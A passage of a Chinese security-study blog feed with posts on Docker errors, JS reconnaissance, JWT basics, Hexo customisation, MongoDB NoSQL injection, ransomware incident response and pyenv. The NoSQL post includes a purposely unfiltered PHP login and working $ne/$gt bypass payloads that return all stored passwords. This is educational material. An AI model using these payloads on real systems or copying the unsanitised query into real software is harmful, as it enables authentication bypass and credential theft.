<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line">显示所有容器</span><br><span class="line">docker rm -f 193a1f7f78319eeb43040d2a7b314be04a5b2a915add2df4d8cf6b07f6c1252d</span><br><span class="line">删除占用容器 id</span><br><span class="line">docker-compose up -d</span><br><span class="line">重新启动容器</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>报错</category>
      </categories>
      <tags>
        <tag>docker报错</tag>
      </tags>
  </entry>
  <entry>
    <title>js文件能找到什么</title>
    <url>/posts/397418bf.html</url>
    <content><![CDATA[<h1 id="js文件可以找到"><a href="#js文件可以找到" class="headerlink" title="js文件可以找到?"></a>js文件可以找到?</h1><p>会增加攻击面的信息（URL，域名等）</p>
<p>敏感信息（密码，API密钥，bucket等）</p>
<p>代码中的潜在危险函数操作（eval，dangerallySetInnerHTML等）</p>
<p>具有已知漏洞的组件（过时的框架等）</p>
<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p>识别并收集应用程序中的JavaScript文件</p>
<p>使收集的JavaScript代码可读（取消最小化&#x2F;反混淆）</p>
<p>识别可能导致安全问题的信息（找敏感词）</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JS逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>portswigger jwt authentication bypass</title>
    <url>/posts/cf3c54f2.html</url>
    <content><![CDATA[<h1 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h1><p>JWT(json web token)是用于系统之间发送加密签名的JSON数据的标准化格式，作为身份认证、会话处理和访问控制机制的一部分。<br>与传统的会话令牌不同，服务器所需要的数据存储在jwt本身的客户端。</p>
<h1 id="JWT格式"><a href="#JWT格式" class="headerlink" title="JWT格式"></a>JWT格式</h1><p>JWT由三部分组成，头部，载荷，签名，每个部分通过.链接<br>header.payload.signature</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA</span><br></pre></td></tr></table></figure>
<p>JWT的头部和载荷部分是base64url编码的json对象，头部包含令牌本身的元数据，载荷包含用户的声明，例如上述部分解码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;iss&quot;: &quot;portswigger&quot;,</span><br><span class="line">    &quot;exp&quot;: 1648037164,</span><br><span class="line">    &quot;name&quot;: &quot;Carlos Montoya&quot;,</span><br><span class="line">    &quot;sub&quot;: &quot;carlos&quot;,</span><br><span class="line">    &quot;role&quot;: &quot;blog_author&quot;,</span><br><span class="line">    &quot;email&quot;: &quot;carlos@carlos-montoya.net&quot;,</span><br><span class="line">    &quot;iat&quot;: 1516239022</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正如上面部分的编码，任何有权访问jwt令牌的人都可以解码读取或修改这部分数据，因此基于jwt机制的安全性严重依赖于第三部分的加密签名。</p>
<h1 id="jwt签名"><a href="#jwt签名" class="headerlink" title="jwt签名"></a>jwt签名</h1><p>发出jwt令牌的服务器通过header和payload进行生成签名，某些情况下还会加密哈希，无论哪种方式都会涉及密钥，这种机制为服务器提供了一种验证令牌数据是否有被篡改。即：<br>签名通过header和payload产生，若前两部分遭到修改则导致签名不匹配<br>若不知道密钥，则无法为header和payload生成正确的签名。</p>
<h1 id="jwt-jws-jwe"><a href="#jwt-jws-jwe" class="headerlink" title="jwt&#x2F;jws&#x2F;jwe"></a>jwt&#x2F;jws&#x2F;jwe</h1>]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JWT Vulnerabilitiy</tag>
      </tags>
  </entry>
  <entry>
    <title>本站hexo魔改</title>
    <url>/posts/ab21860c.html</url>
    <content><![CDATA[<h1 id="自定义文件"><a href="#自定义文件" class="headerlink" title="自定义文件"></a>自定义文件</h1><p>网上大部分魔改是通过修改主题文件，虽然快速直接，但是遇到主题更新会重置，因此博客通过添加自定义css和js文件实现的魔改即使主题更新也会保留。<br>创建的文件位置:<br>博客根目录下的source文件夹(不是themes下的source)创建js和css。<br><img src="/img/modify/touchjscss.png"></p>
<h2 id="引入文件位置"><a href="#引入文件位置" class="headerlink" title="引入文件位置"></a>引入文件位置</h2><p><a href="https://blog.leonus.cn/2022/custom.html">https://blog.leonus.cn/2022/custom.html</a></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">  <span class="comment"># 自定义css</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;../css/loading.css?1&quot;&gt;</span></span><br><span class="line">      <span class="comment"># 静态文件后加个 ?任意内容 可以在每次更新后用户自动重新请求</span></span><br><span class="line">      <span class="comment"># 例如添加 ?1 ,在修改此文件后改成 ?2 ,用户访问你的网站时,不会使用本地的缓存,而是请求新的内容。没修改的话就不用动。</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;../css/transparency.css&quot;&gt;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;../css/social_iconfont.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">  <span class="comment"># 自定义js</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">async</span> <span class="string">src=&quot;/js/title_change.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#引入多个文件就直接复制一行更改文件名即可</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/js/文件名&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="加载动画"><a href="#加载动画" class="headerlink" title="加载动画"></a>加载动画</h1><h2 id="loading动画步骤"><a href="#loading动画步骤" class="headerlink" title="loading动画步骤"></a>loading动画步骤</h2><p>满屏与 pace 同时启用<br><a href="https://blog.anheyu.com/posts/52d8.html">https://blog.anheyu.com/posts/52d8.html</a><br>修改加载动画。(script(async)使用异步加载防止加载其他页面时阻塞该脚本的加载;settimeout设置定时器防止过长的动画加载时间)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">themes/butterfly/layout/includes/loading/fullpage-loading.pug</span><br></pre></td></tr></table></figure>
<p>根据配置选项theme.preloader.source的值来选择加载动画的不同实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">themes/butterfly/layout/includes/loading/index.pug</span><br></pre></td></tr></table></figure>
<p>定义了一个名为 .pace 的加载动画样式实现页面加载时的进度条效果，若启用此css需将配置文件_config.butterfly.yml的pace_css_url值留空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source/css/progress_bar.css</span><br></pre></td></tr></table></figure>
<p>定义加载动画样式，其中颜色代码–anzhiyu-card-bg等需自行替换为自己的色值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">themes/butterfly/source/css/_layout/loading.styl</span><br></pre></td></tr></table></figure>
<p>新增文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source/css/loading.css</span><br></pre></td></tr></table></figure>
<p>修改主题配置文件_config.butterfly.yml的preloader项</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Loading Animation</span></span><br><span class="line"><span class="attr">preloader:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source</span></span><br><span class="line">  <span class="comment"># 1. fullpage-loading</span></span><br><span class="line">  <span class="comment"># 2. pace (progress bar)</span></span><br><span class="line">  <span class="comment"># 3. all</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># pace theme (see https://codebyzach.github.io/pace/)</span></span><br><span class="line">  <span class="attr">pace_css_url:</span> <span class="string">/css/progress_bar.css</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="comment"># 自定义头像</span></span><br></pre></td></tr></table></figure>

<h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><p><a href="https://blog.ccknbc.cc/posts/hexo-butterfly-algolia/">https://blog.ccknbc.cc/posts/hexo-butterfly-algolia/</a></p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo魔改</tag>
      </tags>
  </entry>
  <entry>
    <title>mongodb-nosql注入</title>
    <url>/posts/a6cd1ff3.html</url>
    <content><![CDATA[<h1 id="nosql注入方式"><a href="#nosql注入方式" class="headerlink" title="nosql注入方式"></a>nosql注入方式</h1><h2 id="按照语言的分类"><a href="#按照语言的分类" class="headerlink" title="按照语言的分类"></a>按照语言的分类</h2><p>PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等</p>
<h2 id="按照攻击机制分类"><a href="#按照攻击机制分类" class="headerlink" title="按照攻击机制分类"></a>按照攻击机制分类</h2><p>重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。<br>还有背负式查询 、跨域违规等<br>重言式注入<br>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。<br>联合查询注入<br>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。<br>JavaScript 注入<br>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。<br>盲注<br>当页面没有回显时，那么我们可以通过 $regex 正则表达式来达到和传统 SQL 注入中 substr() 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。<br>背负式查询<br>在背负式查询中，攻击者通过利用转义特定字符（比如像回车和换行之类的结束符）插入由数据库额外执行的查询，这样就可以执行任意代码了。<br>跨域违规<br>HTTP REST APIs是NoSQL数据库中的一个流行模块，然而，它们引入了一类新的漏洞，它甚至能让攻击者从其他域攻击数据库。在跨域攻击中，攻击者利用合法用户和他们的网页浏览器执行有害的操作。在本文中，我们将展示此类跨站请求伪造（CSRF）攻击形式的违规行为，在此网站信任的用户浏览器将被利用在NoSQL数据库上执行非法操作。通过把HTML格式的代码注入到有漏洞的网站或者欺骗用户进入到攻击者自己的网站上，攻击者可以在目标数据库上执行post动作，从而破坏数据库</p>
<h1 id="mongodb注入举例"><a href="#mongodb注入举例" class="headerlink" title="mongodb注入举例"></a>mongodb注入举例</h1><h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><p>mongodb名称对比SQL</p>
<table>
<thead>
<tr>
<th>SQL术语&#x2F;概念</th>
<th>MongoDB术语&#x2F;概念</th>
<th>解释&#x2F;说明</th>
</tr>
</thead>
<tbody><tr>
<td>database</td>
<td>database</td>
<td>数据库</td>
</tr>
<tr>
<td>table</td>
<td>collection</td>
<td>数据库表&#x2F;集合</td>
</tr>
<tr>
<td>row</td>
<td>document</td>
<td>数据记录行&#x2F;文档</td>
</tr>
<tr>
<td>column</td>
<td>field</td>
<td>数据字段&#x2F;域</td>
</tr>
<tr>
<td>index</td>
<td>index</td>
<td>索引</td>
</tr>
<tr>
<td>table joins</td>
<td></td>
<td>表连接，mongodb不支持</td>
</tr>
<tr>
<td>primary key</td>
<td>primary key</td>
<td>主键，mongodb自动将_id设为主键</td>
</tr>
</tbody></table>
<p>查询命令对比</p>
<table>
<thead>
<tr>
<th>操作名</th>
<th>mysql</th>
<th>mongodb</th>
</tr>
</thead>
<tbody><tr>
<td>查询所有记录</td>
<td>Select * from tname</td>
<td>db.tname.find()</td>
</tr>
<tr>
<td>查询所有列</td>
<td>Select id from  tname</td>
<td>db.tname.find({},{id:1})</td>
</tr>
<tr>
<td>&#x3D;</td>
<td>Select id from tname where id &#x3D; 2</td>
<td>db.tname.find({‘id’:2})        &#x2F;&#x2F;db.tname.find({‘id’:{$eq:2}})</td>
</tr>
<tr>
<td>&gt;</td>
<td>Select id from tname where id &gt; 2</td>
<td>db.tname.find({‘id’:{$gt:2}})</td>
</tr>
<tr>
<td>&lt;</td>
<td>Select id from tname where id &lt; 2</td>
<td>db.tname.find({‘id’:{$lt:2}})</td>
</tr>
<tr>
<td>&gt;&#x3D;</td>
<td>Select id from tname where id &gt;&#x3D; 2</td>
<td>db.tname.find({‘id’:{$gte:2}})</td>
</tr>
<tr>
<td>&lt;&#x3D;</td>
<td>Select id from tname where id &lt;&#x3D; 2</td>
<td>db.tname.find({‘id’:{$lte:2}})</td>
</tr>
<tr>
<td>and</td>
<td>select * from tname where id&#x3D;2 and name &#x3D; “steve”;</td>
<td>db.tname.find({‘id’:2,name:”steve”})</td>
</tr>
<tr>
<td>限制查询</td>
<td>select * from tname limit 1</td>
<td>db.tname.findOne()</td>
</tr>
<tr>
<td>模糊查询</td>
<td>select * from tname where name like ‘%set%’</td>
<td>db.tname.find({name:&#x2F;set&#x2F;})</td>
</tr>
<tr>
<td>模糊查询</td>
<td>select * from tname where name like ‘set%’</td>
<td>db.tname.find({name:&#x2F;^set&#x2F;})</td>
</tr>
<tr>
<td>查询表中记录数</td>
<td>select count(id) from tname</td>
<td>db.tname.count()</td>
</tr>
<tr>
<td>获取有条件的记录数</td>
<td>select count(iid) from tname where id &#x3D;2</td>
<td>db.tname.find({id:2}).count()</td>
</tr>
<tr>
<td>正序查询</td>
<td>select * from tname order by id</td>
<td>db.tname.find().sort({id:1})</td>
</tr>
<tr>
<td>倒叙查询</td>
<td>select * from tname order by id desc</td>
<td>db.tname.find().sort({id:-1})</td>
</tr>
<tr>
<td>or</td>
<td>select * from tname where name name &#x3D; “mondo” or name &#x3D; “opvow”</td>
<td>db.tname.find({“$or”:[{tname.name:”mondo”},{tname.name:”opvow”}]})</td>
</tr>
</tbody></table>
<h2 id="重言式注入"><a href="#重言式注入" class="headerlink" title="重言式注入"></a>重言式注入</h2><p>在 MongoDB 中选择 test 数据库，创建一个 users 集合并插入文档数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; use test</span><br><span class="line">switched to db test</span><br><span class="line">&gt;</span><br><span class="line">&gt; db.createCollection(&#x27;users&#x27;)</span><br><span class="line">&#123; &quot;ok&quot; : 1 &#125;</span><br><span class="line">&gt;</span><br><span class="line">&gt; db.users.insert(&#123;username: &#x27;admin&#x27;, password: &#x27;123456&#x27;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt; db.users.insert(&#123;username: &#x27;whoami&#x27;, password: &#x27;657260&#x27;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt; db.users.insert(&#123;username: &#x27;bunny&#x27;, password: &#x27;964795&#x27;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt; db.users.insert(&#123;username: &#x27;bob&#x27;, password: &#x27;965379&#x27;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<p>编写连接mogodb数据库的php源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$manager = new MongoDB\Driver\Manager(&quot;mongodb://127.0.0.1:27017&quot;);</span><br><span class="line"></span><br><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">$query = new MongoDB\Driver\Query(array(</span><br><span class="line">    &#x27;username&#x27; =&gt; $username,</span><br><span class="line">    &#x27;password&#x27; =&gt; $password</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();</span><br><span class="line">$count = count($result);</span><br><span class="line">if ($count &gt; 0) &#123;</span><br><span class="line">    foreach ($result as $user) &#123;</span><br><span class="line">        $user = ((array)$user);</span><br><span class="line">        echo &#x27;====Login Success====&lt;br&gt;&#x27;;</span><br><span class="line">        echo &#x27;username:&#x27; . $user[&#x27;username&#x27;] . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">        echo &#x27;password:&#x27; . $user[&#x27;password&#x27;] . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;Login Failed&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>正常用户想要登录时输入的数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=whoami&amp;password=657260</span><br></pre></td></tr></table></figure>
<p>进入 PHP 后的程序数据如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(</span><br><span class="line">    &#x27;username&#x27; =&gt; &#x27;whoami&#x27;,</span><br><span class="line">    &#x27;password&#x27; =&gt; &#x27;657260&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>传入 MongoDB 后执行的查询命令为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;db.users.find(&#123;&#x27;username&#x27;:&#x27;whoami&#x27;,&#x27;password&#x27;:&#x27;657260&#x27;&#125;)&#123;&quot;_id&quot;:ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;),&quot;username&quot;:&quot;whoami&quot;,&quot;password&quot;:&quot;657260&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>从php源代码中可以看出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query = new MongoDB\Driver\Query(array(</span><br><span class="line">    &#x27;username&#x27; =&gt; $username,</span><br><span class="line">    &#x27;password&#x27; =&gt; $password</span><br><span class="line">));</span><br></pre></td></tr></table></figure>
<p>这里对用户输入没有做任何过滤与校验，那么我们可以通过 $ne 关键字构造一个永真的条件就可以完成 NoSQL 注入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>
<p>提交的数据进入 PHP 后的数据如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(</span><br><span class="line">    &#x27;username&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1),</span><br><span class="line">    &#x27;password&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>传入 MongoDB 后执行的查询命令为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; db.users.find(&#123;&#x27;username&#x27;:&#123;$ne:1&#125;, &#x27;password&#x27;:&#123;$ne:1&#125;&#125;)</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c85257f18542b68c4ba&quot;), &quot;username&quot; : &quot;bunny&quot;, &quot;password&quot; : &quot;964795&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c88257f18542b68c4bb&quot;), &quot;username&quot; : &quot;bob&quot;, &quot;password&quot; : &quot;965379&quot; &#125;</span><br></pre></td></tr></table></figure>
<p>也可以使用下面这些作为 payload 进行攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=&amp;password[$ne]=</span><br><span class="line">username[$gt]=&amp;password[$gt]=</span><br><span class="line">username[$gte]=&amp;password[$gte]=</span><br></pre></td></tr></table></figure>
<p>重言式注入又称为永真式，即在条件语句中注入代码使其表达式<br>$ne是在重言式注入中要用到的操作符，作用是将不等于指定值的数据都查询出来，如$ne&#x3D;1就是将不为1的值全部查询出来<br>‘});<br>如果我们发送 value&#x3D;1 那么，也就是发送了一个 value 的值为 1 的数据。如果发送 value[$ne]&#x3D;1 则 PHP 会将其转换为数组 value&#x3D;array($ne&#x3D;&gt;1)，当数据到了进入 MongoDB 后，原来一个单一的 {“value”:1} 查询就变成了一个 {“value”:{$ne:1} 条件查询</p>
<p>后台查询语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#x27;123456&#x27;&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>nosql-inject</tag>
      </tags>
  </entry>
  <entry>
    <title>lesuo</title>
    <url>/posts/4fea4d13.html</url>
    <content><![CDATA[<h2 id="第3篇：勒索病毒"><a href="#第3篇：勒索病毒" class="headerlink" title="第3篇：勒索病毒"></a>第3篇：勒索病毒</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​	勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。自WannaCry勒索病毒在全球爆发之后，各种变种及新型勒索病毒层出不穷。</p>
<h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​	某天早上，网站管理员打开OA系统，首页访问异常，显示乱码：</p>
<p><img src="/image/win-7-1.png"></p>
<h3 id="0x02-事件分析"><a href="#0x02-事件分析" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p>​	登录网站服务器进行排查，在站点目录下发现所有的脚本文件及附件都被加密为.sage结尾的文件，每个文件夹下都有一个!HELP_SOS.hta文件，打包了部分样本：</p>
<p><img src="/image/win-7-2.png"></p>
<p>打开!HELP_SOS.hta文件，显示如下： </p>
<p><img src="/image/win-7-3.png"></p>
<p>到这里，基本可以确认是服务器中了勒索病毒，上传样本到360勒索病毒网站（<a href="http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。">http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。</a></p>
<p><img src="/image/win-7-4.png"></p>
<p>绝大多数勒索病毒，是无法解密的，一旦被加密，即使支付也不一定能够获得解密密钥。在平时运维中应积极做好备份工作，数据库与源码分离（类似OA系统附件资源也很重要，也要备份）。 </p>
<p>遇到了，别急，试一试勒索病毒解密工具：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">“拒绝勒索软件”网站</span><br><span class="line">https://www.nomoreransom.org/zh/index.html</span><br><span class="line">360安全卫士勒索病毒专题</span><br><span class="line">http://lesuobingdu.360.cn</span><br></pre></td></tr></table></figure>

<h3 id="0x04-防范措施"><a href="#0x04-防范措施" class="headerlink" title="0x04 防范措施"></a>0x04 防范措施</h3><p>​	一旦中了勒索病毒，文件会被锁死，没有办法正常访问了，这时候，会给你带来极大的困恼。为了防范这样的事情出现，我们电脑上要先做好一些措施：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、安装杀毒软件，保持监控开启，定期全盘扫描</span><br><span class="line">2、及时更新 Windows安全补丁，开启防火墙临时关闭端口，如445、135、137、138、139、3389等端口</span><br><span class="line">3、及时更新web漏洞补丁，升级web组件</span><br><span class="line">4、备份。重要的资料一定要备份，谨防资料丢失</span><br><span class="line">5、强化网络安全意识，陌生链接不点击，陌生文件不要下载，陌生邮件不要打开</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>pyenv 简单使用记录</title>
    <url>/posts/199c3661.html</url>
    <content><![CDATA[<h1 id="项目下载"><a href="#项目下载" class="headerlink" title="项目下载"></a>项目下载</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git pyenv项目（我是下载pyenv然后解压到root下，plugin插件没有virtualenv-init，后面用git下载）</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ~]$ git clone https://github.com/pyenv/pyenv.git ~/.pyenv</span><br></pre></td></tr></table></figure>
<h1 id="bashrc环境配置"><a href="#bashrc环境配置" class="headerlink" title=".bashrc环境配置"></a>.bashrc环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;export PATH=&quot;$HOME/.pyenv/bin:$PATH&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv init --path)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv virtualenv-init -)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
<h1 id="error"><a href="#error" class="headerlink" title="error"></a>error</h1><p>更新出错显示没有virtualenv-init</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# source /root/.bashrc</span><br><span class="line">pyenv: no such command `virtualenv-init&#x27;</span><br></pre></td></tr></table></figure>

<p>这个命令可以将下载的插件直接放入pyenv的plugin插件文件夹下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# git clone https://github.com/pyenv/pyenv-virtualenv.git $(pyenv root)/plugins/pyenv-virtualenv</span><br><span class="line">Cloning into &#x27;/root/.pyenv/plugins/pyenv-virtualenv&#x27;...</span><br><span class="line">remote: Enumerating objects: 2301, done.</span><br><span class="line">再次更新成功</span><br></pre></td></tr></table></figure>
<h1 id="本地缓存加快python包解压缩"><a href="#本地缓存加快python包解压缩" class="headerlink" title="本地缓存加快python包解压缩"></a>本地缓存加快python包解压缩</h1><p>创建cache文件夹缓存下载好的python压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[python@iZuf6fkxk1equ6kjtxh1u3Z .pyenv]$ mkdir cache</span><br></pre></td></tr></table></figure>
<p>直接使用pyenv下载环境速度很慢，推荐本地主机提前下载好python版本后scp上传服务器<br>（之前没用密钥认证可以使用kali，后续使用密钥认证后使用xshell的本地终端上传，但每次需要认证ssh密钥，有点麻烦）</p>
<h1 id="scp文件上传"><a href="#scp文件上传" class="headerlink" title="scp文件上传"></a>scp文件上传</h1><p>scp（secure copy） 需要上传的文件  上传到的用户（比如root账户或其他创建的账户）@服务器IP:目标文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/tools/py-env]</span><br><span class="line">└─# scp Python-3.10.0.tgz python@xxx.xxx.xxx.xxx:~/.pyenv/cache</span><br></pre></td></tr></table></figure>
<h1 id="查看配置"><a href="#查看配置" class="headerlink" title="查看配置"></a>查看配置</h1><p>确认pyenv和virtualenv-init是否配置完成</p>
